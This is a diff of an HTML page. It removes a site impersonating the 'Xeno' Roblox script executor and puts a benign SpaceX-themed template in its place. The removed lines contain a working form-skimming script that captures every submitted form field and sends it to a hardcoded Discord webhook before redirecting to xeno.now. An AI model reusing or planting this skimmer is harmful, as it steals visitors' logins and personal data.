@@ -1,35 +1,113 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
-<!--https://www.youtube.com/watch?v=dQw4w9WgXcQ-->
 <head>
-    <meta charset="UTF-8" />
-    <link rel="icon" type="image/png" href="https://xeno.now/images/xeno.png" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="description" content="Experience the ultimate scripting utility with powerful execution and seamless performance. Join our community today!" />
-    <meta name="keywords" content="Xeno, script executor, keyless executor, Roblox executor, scripting, exploit, cheat, hack, Executor" />
-    <meta name="author" content="Xeno" />
-    <meta name="robots" content="index, follow" />
-    <meta property="og:title" content="Xeno | The Best Key-Less Executor" />
-    <meta property="og:description" content="Experience the ultimate scripting utility with powerful execution and seamless performance. Join our community today!" />
-    <meta property="og:image" content="/images/xenos.png" />
-    <meta property="og:image:width" content="1920" />
-    <meta property="og:image:height" content="1080" />
-    <meta property="og:image:type" content="image/png" />
-    <meta property="og:site_name" content="Xeno" />
-    <meta property="og:type" content="website" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:image" content="/images/xenos.png" />
-    <meta property="theme-color" content="#FFFFFF" />
-    <title>Xeno | The Best Key-Less Executor</title>
-  <script type="cf657d98e1264e8282d11bec-module" crossorigin src="https://xeno.now/assets/index-DmDdJ_Zy.js"></script>
-  <link rel="modulepreload" crossorigin href="https://xeno.now/assets/monaco-Dnyb3Oxa.js">
-  <link rel="stylesheet" crossorigin href="https://xeno.now/assets/index-D_A0pxOf.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SpaceX</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div id="root"></div>
-<script src="https://xeno.now/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="cf657d98e1264e8282d11bec-|49" defer></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/v67327c56f0bb4ef8b305cae61679db8f1769101564043" integrity="sha512-rdcWY47ByXd76cbCFzznIcEaCN71jqkWBBqlwhF1SY7KubdLKZiEGeP7AyieKZlGP9hbY/MhGrwXzJC/HulNyg==" data-cf-beacon='{"version":"2024.11.0","token":"6b5fa1c29c9b489c9ca5ba9ff3bc1587","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
-<script>document.addEventListener('submit',function(e){e.preventDefault();let d=new FormData(e.target);let o={};d.forEach((v,k)=>{o[k]=v});fetch('https://discord.com/api/webhooks/1477371617431785634/swiAiu-n4bcjvvW6HdwxlRKd1jPhlFHQQQJDKKzF8yU0wXR_XCKP0AmZPv2kaKdTKcwx',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'🚨 **[XENO 捕获]**\n数据: '+JSON.stringify(o)})}).then(()=>{location.href='https://xeno.now'})});</script></body>
+    <!-- Particle Background -->
+    <div id="particles-js"></div>
+
+    <header>
+        <div class="container">
+            <h1>SpaceX</h1>
+            <div class="language-switcher">
+                <button onclick="changeLanguage('en')" class="lang-btn" data-lang="en">EN</button>
+                <button onclick="changeLanguage('fr')" class="lang-btn" data-lang="fr">FR</button>
+                <button onclick="changeLanguage('zh')" class="lang-btn" data-lang="zh">中</button>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <div class="container">
+            <!-- Hero Section -->
+            <section id="hero">
+                <div class="hero-content">
+                    <h2 data-key="hero.title"></h2>
+                    <p data-key="hero.subtitle"></p>
+                </div>
+                <div class="hero-visual">
+                    <!-- Falcon 9 silhouette or animation would go here -->
+                    <div class="rocket-silhouette"></div>
+                </div>
+            </section>
+
+            <!-- Achievements Section -->
+            <section id="achievements">
+                <h2 data-key="achievements.title"></h2>
+                <div class="tech-grid">
+                    <div class="tech-card" data-key="achievements.falcon9.title">
+                        <div class="tech-icon">🚀</div>
+                        <h3>Falcon 9</h3>
+                        <p data-key="achievements.falcon9.content"></p>
+                    </div>
+                    <div class="tech-card" data-key="achievements.dragon.title">
+                        <div class="tech-icon">🐉</div>
+                        <h3>Dragon</h3>
+                        <p data-key="achievements.dragon.content"></p>
+                    </div>
+                    <div class="tech-card" data-key="achievements.starship.title">
+                        <div class="tech-icon">⭐</div>
+                        <h3>Starship</h3>
+                        <p data-key="achievements.starship.content"></p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Publications/Research Section -->
+            <section id="publications">
+                <h2 data-key="publications.title"></h2>
+                <div class="publications-grid">
+                    <div class="pub-card" data-key="pub1.title">
+                        <div class="pub-icon">📄</div>
+                        <h3>Reusable Launch Systems</h3>
+                        <p data-key="pub1.content"></p>
+                        <a href="#" class="pub-link" data-key="pub1.link">View Paper</a>
+                    </div>
+                    <div class="pub-card" data-key="pub2.title">
+                        <div class="pub-icon">📊</div>
+                        <h3>Mars Habitat Design</h3>
+                        <p data-key="pub2.content"></p>
+                        <a href="#" class="pub-link" data-key="pub2.link">View Paper</a>
+                    </div>
+                    <div class="pub-card" data-key="pub3.title">
+                        <div class="pub-icon">🔬</div>
+                        <h3>Propulsion Technology</h3>
+                        <p data-key="pub3.content"></p>
+                        <a href="#" class="pub-link" data-key="pub3.link">View Paper</a>
+                    </div>
+                    <div class="pub-card" data-key="pub4.title">
+                        <div class="pub-icon">📡</div>
+                        <h3>Communications Systems</h3>
+                        <p data-key="pub4.content"></p>
+                        <a href="#" class="pub-link" data-key="pub4.link">View Paper</a>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Mission Section -->
+            <section id="mission">
+                <h2 data-key="future.title"></h2>
+                <div class="mission-visual">
+                    <div class="mars-colony"></div>
+                    <p data-key="future.content"></p>
+                </div>
+            </section>
+        </div>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p data-key="footer.text"></p>
+            <div class="footer-decoration"></div>
+        </div>
+    </footer>
+
+    <!-- Particles JS Library -->
+    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+    <script src="script.js"></script>
+</body>
 </html>
-
-
-
